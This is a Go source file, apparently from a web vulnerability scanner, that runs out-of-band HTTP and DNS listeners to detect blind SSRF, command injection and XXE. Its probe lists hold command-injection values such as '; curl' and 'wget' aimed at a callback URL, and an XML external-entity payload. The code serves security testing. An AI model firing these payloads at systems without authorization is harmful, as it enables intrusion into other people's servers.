package engine

import (
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"github.com/google/uuid"
)

type OOBServer struct {
	Port      int
	Address   string
	Callbacks map[string]*OOBCallback
	mu        sync.Mutex
	server    *http.Server
	listener  net.Listener
	running   atomic.Bool
}

type OOBCallback struct {
	ID        string
	ProbeID   string
	Payload   string
	VulnType  string
	TargetURL string
	Method    string
	Headers   map[string]string
	Body      string
	Time      time.Time
}

type OOBProbe struct {
	ID      string
	Type    string
	Payload string
	Target  string
}

func NewOOBServer() (*OOBServer, error) {
	listener, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		return nil, err
	}
	port := listener.Addr().(*net.TCPAddr).Port
	callbackAddr := fmt.Sprintf("127.0.0.1:%d", port)
	if ip := outboundIPv4(); ip != nil {
		callbackAddr = fmt.Sprintf("%s:%d", ip.String(), port)
	} else {
		addrs, _ := net.InterfaceAddrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				callbackAddr = fmt.Sprintf("%s:%d", ipnet.IP.String(), port)
				break
			}
		}
	}
	oob := &OOBServer{
		Port:      port,
		Address:   callbackAddr,
		Callbacks: make(map[string]*OOBCallback),
		listener:  listener,
	}
	oob.running.Store(true)

	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		oob.handleCallback(w, r)
	})

	oob.server = &http.Server{Handler: mux}
	go func() {
		oob.server.Serve(listener)
	}()

	output.Info("OOB Callback server listening on %s", oob.Address)
	return oob, nil
}

func (o *OOBServer) handleCallback(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/")
	if i := strings.IndexByte(id, '/'); i >= 0 {
		id = id[:i]
	}

	body := core.ReadBody(r.Body)
	r.Body.Close()

	headers := make(map[string]string)
	for k, vals := range r.Header {
		headers[k] = strings.Join(vals, ", ")
	}

	cb := &OOBCallback{
		ID:      id,
		Method:  r.Method,
		Headers: headers,
		Body:    string(body),
		Time:    time.Now(),
	}

	o.mu.Lock()
	if existing, ok := o.Callbacks[id]; ok {
		cb.ProbeID = existing.ProbeID
		cb.Payload = existing.Payload
		cb.VulnType = existing.VulnType
		cb.TargetURL = existing.TargetURL
	} else {
		o.mu.Unlock()
		w.WriteHeader(200)
		w.Write([]byte("OK"))
		return
	}
	o.Callbacks[id] = cb
	o.mu.Unlock()

	output.VulnInline("OOB", "callback received: %s → %s", id, cb.VulnType)
	w.WriteHeader(200)
	w.Write([]byte("OK"))
}

func (o *OOBServer) RegisterProbe(probeType, targetURL, payload string) (string, string) {
	id := randomID(16)
	oobURL := fmt.Sprintf("http://%s/%s", o.Address, id)

	o.mu.Lock()
	o.Callbacks[id] = &OOBCallback{
		ID:        id,
		ProbeID:   id,
		Payload:   strings.ReplaceAll(payload, "{{OOB_URL}}", oobURL),
		VulnType:  probeType,
		TargetURL: targetURL,
	}
	o.mu.Unlock()

	return id, oobURL
}

func (o *OOBServer) HasCallback(id string) bool {
	o.mu.Lock()
	defer o.mu.Unlock()
	cb, ok := o.Callbacks[id]
	return ok && cb.Time.After(time.Time{}) && cb.Method != ""
}

func (o *OOBServer) CallbacksSnapshot() []OOBCallback {
	o.mu.Lock()
	defer o.mu.Unlock()
	var out []OOBCallback
	for _, cb := range o.Callbacks {
		if cb.Method != "" {
			out = append(out, *cb)
		}
	}
	return out
}

func (o *OOBServer) Close() {
	if o.running.Load() {
		o.listener.Close()
		o.running.Store(false)
	}
}

type DNSInteraction struct {
	QName string
	QType string
	From  string
	Time  time.Time
}

type DNSOOB struct {
	conn    *net.UDPConn
	selfIP  net.IP
	mu      sync.Mutex
	queries []DNSInteraction
	closed  bool
}

func NewDNSOOB(addr string) (*DNSOOB, error) {
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		return nil, err
	}
	conn, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		return nil, err
	}
	d := &DNSOOB{
		conn:   conn,
		selfIP: detectSelfIP(),
	}
	go d.loop()
	output.Info("DNS OOB listener on %s (queries recorded)", addr)
	return d, nil
}

func detectSelfIP() net.IP {
	addrs, _ := net.InterfaceAddrs()
	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
			return ipnet.IP.To4()
		}
	}
	return net.IPv4(127, 0, 0, 1)
}

func (d *DNSOOB) loop() {
	buf := make([]byte, 4096)
	for {
		n, raddr, err := d.conn.ReadFrom(buf)
		if err != nil {
			return
		}
		qname, qtype, ok := parseDNSQuery(buf[:n])
		if !ok {
			continue
		}
		d.mu.Lock()
		d.queries = append(d.queries, DNSInteraction{
			QName: qname,
			QType: qtype,
			From:  raddr.String(),
			Time:  time.Now(),
		})
		d.mu.Unlock()

		if reply := buildDNSReply(buf[:n], qname, qtype, d.selfIP); reply != nil {
			d.conn.WriteTo(reply, raddr)
		}
	}
}

func (d *DNSOOB) Queries() []DNSInteraction {
	d.mu.Lock()
	defer d.mu.Unlock()
	out := make([]DNSInteraction, len(d.queries))
	copy(out, d.queries)
	return out
}

func (d *DNSOOB) HasInteraction(qname string) bool {
	if d == nil {
		return false
	}
	qname = strings.ToLower(strings.TrimSuffix(qname, "."))
	d.mu.Lock()
	defer d.mu.Unlock()
	for _, q := range d.queries {
		if strings.ToLower(strings.TrimSuffix(q.QName, ".")) == qname {
			return true
		}
	}
	return false
}

func (d *DNSOOB) Close() error {
	if d != nil && d.conn != nil {
		return d.conn.Close()
	}
	return nil
}

func parseDNSQuery(pkt []byte) (qname, qtype string, ok bool) {
	if len(pkt) < 12 {
		return "", "", false
	}
	flags := uint16(pkt[2])<<8 | uint16(pkt[3])
	if flags&0x8000 != 0 {
		return "", "", false
	}
	qd := uint16(pkt[4])<<8 | uint16(pkt[5])
	if qd < 1 {
		return "", "", false
	}
	i := 12
	var labels []string
	for {
		if i >= len(pkt) {
			return "", "", false
		}
		l := int(pkt[i])
		if l == 0 {
			i++
			break
		}
		if l&0xC0 == 0xC0 {
			return "", "", false
		}
		if i+1+l > len(pkt) {
			return "", "", false
		}
		labels = append(labels, string(pkt[i+1:i+1+l]))
		i += l + 1
	}
	if i+4 > len(pkt) {
		return "", "", false
	}
	t := uint16(pkt[i])<<8 | uint16(pkt[i+1])
	qtype = dnsTypeName(t)
	return strings.Join(labels, "."), qtype, true
}

func dnsTypeName(t uint16) string {
	switch t {
	case 1:
		return "A"
	case 2:
		return "NS"
	case 5:
		return "CNAME"
	case 15:
		return "MX"
	case 16:
		return "TXT"
	case 28:
		return "AAAA"
	case 33:
		return "SRV"
	default:
		return fmt.Sprintf("TYPE%d", t)
	}
}

func buildDNSReply(query []byte, qname, qtype string, selfIP net.IP) []byte {
	if len(query) < 12 {
		return nil
	}
	rep := make([]byte, 0, 64)
	rep = append(rep, query[:2]...)
	flags := uint16(query[2])<<8 | uint16(query[3])
	flags |= 0x8000 | 0x0080
	rep = append(rep, byte(flags>>8), byte(flags&0xFF))
	rep = append(rep, 0, 1)
	ancount := 0
	if qtype == "A" && selfIP != nil {
		ancount = 1
	}
	rep = append(rep, byte(ancount>>8), byte(ancount&0xFF))
	rep = append(rep, 0, 0, 0, 0)

	qi := 12
	for qi < len(query) && query[qi] != 0 {
		l := int(query[qi])
		if qi+1+l+1 > len(query) {
			return nil
		}
		qi += l + 1
	}
	if qi+4 >= len(query) {
		return nil
	}
	rep = append(rep, query[12:qi+5]...)

	if ancount == 1 {
		rep = append(rep, 0xC0, 0x0C)
		rep = append(rep, 0, 1, 0, 1)
		rep = append(rep, 0, 0, 0, 60)
		rep = append(rep, 0, 4)
		rep = append(rep, selfIP...)
	}
	return rep
}

func RunOOBProbes(client *http.Client, cfg *core.Config, targetURL string, oob *OOBServer, dns *DNSOOB) []core.ScanResult {
	var results []core.ScanResult

	type probe struct {
		Type    string
		Param   string
		Payload string
	}
	probes := []probe{
		{"SSRF", "url", "{{OOB_URL}}"},
		{"SSRF", "proxy", "{{OOB_URL}}"},
		{"SSRF", "target", "{{OOB_URL}}"},
		{"SSRF", "next", "{{OOB_URL}}"},
		{"CMDI", "host", "; curl {{OOB_URL}}"},
		{"CMDI", "cmd", "wget {{OOB_URL}}"},
		{"CMDI", "command", "`curl {{OOB_URL}}`"},
	}

	noRedir := &http.Client{
		Timeout:       client.Timeout,
		Transport:     client.Transport,
		Jar:           client.Jar,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}

	send := func(req *http.Request) {
		core.ApplyHeaders(req, cfg)
		if resp, err := noRedir.Do(req); err == nil && resp != nil {
			resp.Body.Close()
		}
	}

	for _, pr := range probes {
		id, oobURL := oob.RegisterProbe(pr.Type, targetURL, pr.Payload)
		payload := strings.ReplaceAll(pr.Payload, "{{OOB_URL}}", oobURL)

		testURL, err := core.SetParamRaw(targetURL, pr.Param, payload)
		if err != nil {
			continue
		}
		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}
		send(req)

		if waitForCallback(oob, id, 2500*time.Millisecond) {
			oob.mu.Lock()
			cb := oob.Callbacks[id]
			oob.mu.Unlock()
			results = append(results, core.ScanResult{
				Type:      fmt.Sprintf("OOB %s (Blind Detection)", pr.Type),
				URL:       testURL,
				Method:    "GET",
				Parameter: pr.Param,
				Payload:   payload,
				Severity:  "CRITICAL",
				Evidence:  fmt.Sprintf("OOB callback confirmed: %s at %s — %s", id, cb.Time.Format("15:04:05"), pr.Payload),
				Timestamp: time.Now(),
			})
		}
	}

	id, oobURL := oob.RegisterProbe("XXE", targetURL, xxeBody)
	payload := strings.ReplaceAll(xxeBody, "{{OOB_URL}}", oobURL)
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(payload))
	if err == nil {
		req.Header.Set("Content-Type", "application/xml")
		send(req)
		if waitForCallback(oob, id, 2500*time.Millisecond) {
			oob.mu.Lock()
			cb := oob.Callbacks[id]
			oob.mu.Unlock()
			results = append(results, core.ScanResult{
				Type:      "OOB XXE (Blind Detection)",
				URL:       targetURL,
				Method:    "POST",
				Parameter: "xml_body",
				Payload:   payload,
				Severity:  "CRITICAL",
				Evidence:  fmt.Sprintf("OOB callback confirmed: %s at %s — XML external entity fetched", id, cb.Time.Format("15:04:05")),
				Timestamp: time.Now(),
			})
		}
	}

	if dns != nil && cfg.OOBDomain != "" {
		results = append(results, runDNSOOBProbes(client, cfg, targetURL, dns)...)
	}

	return results
}

func runDNSOOBProbes(client *http.Client, cfg *core.Config, targetURL string, dns *DNSOOB) []core.ScanResult {
	var results []core.ScanResult
	type probe struct {
		Type    string
		Param   string
		Payload string
	}
	probes := []probe{
		{"DNS SSRF", "url", "http://{{OOB_DNS}}/"},
		{"DNS SSRF", "proxy", "http://{{OOB_DNS}}/"},
		{"DNS SSRF", "target", "http://{{OOB_DNS}}/"},
		{"DNS CMDI", "host", "; curl {{OOB_DNS}}"},
		{"DNS CMDI", "cmd", "wget {{OOB_DNS}}"},
		{"DNS CMDI", "command", "`curl {{OOB_DNS}}`"},
	}
	noRedir := &http.Client{
		Timeout:       client.Timeout,
		Transport:     client.Transport,
		Jar:           client.Jar,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}

	send := func(req *http.Request) {
		core.ApplyHeaders(req, cfg)
		if resp, err := noRedir.Do(req); err == nil && resp != nil {
			resp.Body.Close()
		}
	}
	for _, pr := range probes {
		qname := "sxel-" + randomID(10) + "." + cfg.OOBDomain
		payload := strings.ReplaceAll(pr.Payload, "{{OOB_DNS}}", qname)
		testURL, err := core.SetParamRaw(targetURL, pr.Param, payload)
		if err != nil {
			continue
		}
		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}
		send(req)
		if waitForDNS(dns, qname, 2500*time.Millisecond) {
			results = append(results, core.ScanResult{
				Type:      fmt.Sprintf("OOB %s (Blind Detection via DNS)", pr.Type),
				URL:       testURL,
				Method:    "GET",
				Parameter: pr.Param,
				Payload:   payload,
				Severity:  "CRITICAL",
				Evidence:  fmt.Sprintf("DNS resolution confirmed: %s — %s", qname, pr.Payload),
				Timestamp: time.Now(),
			})
		}
	}

	qname := "sxel-" + randomID(10) + "." + cfg.OOBDomain
	dnsXXE := strings.ReplaceAll(xxeBody, "{{OOB_URL}}", "http://"+qname+"/")
	dreq, derr := http.NewRequest("POST", targetURL, strings.NewReader(dnsXXE))
	if derr == nil {
		dreq.Header.Set("Content-Type", "application/xml")
		send(dreq)
		if waitForDNS(dns, qname, 2500*time.Millisecond) {
			results = append(results, core.ScanResult{
				Type:      "OOB XXE (Blind Detection via DNS)",
				URL:       targetURL,
				Method:    "POST",
				Parameter: "xml_body",
				Payload:   dnsXXE,
				Severity:  "CRITICAL",
				Evidence:  fmt.Sprintf("DNS resolution confirmed: %s — external entity fetched", qname),
				Timestamp: time.Now(),
			})
		}
	}
	return results
}

func waitForDNS(dns *DNSOOB, qname string, timeout time.Duration) bool {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if dns.HasInteraction(qname) {
			return true
		}
		time.Sleep(100 * time.Millisecond)
	}
	return dns.HasInteraction(qname)
}

const xxeBody = `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{{OOB_URL}}">]>
<root>&xxe;</root>`

func waitForCallback(o *OOBServer, id string, timeout time.Duration) bool {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if o.HasCallback(id) {
			return true
		}
		time.Sleep(100 * time.Millisecond)
	}
	return o.HasCallback(id)
}

func randomID(n int) string {
	id := strings.ReplaceAll(uuid.NewString(), "-", "")
	if len(id) > n {
		id = id[:n]
	}
	return id
}

func outboundIPv4() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return nil
	}
	defer conn.Close()
	addr, ok := conn.LocalAddr().(*net.UDPAddr)
	if !ok || addr == nil || addr.IP.IsLoopback() || addr.IP.To4() == nil {
		return nil
	}
	return addr.IP
}
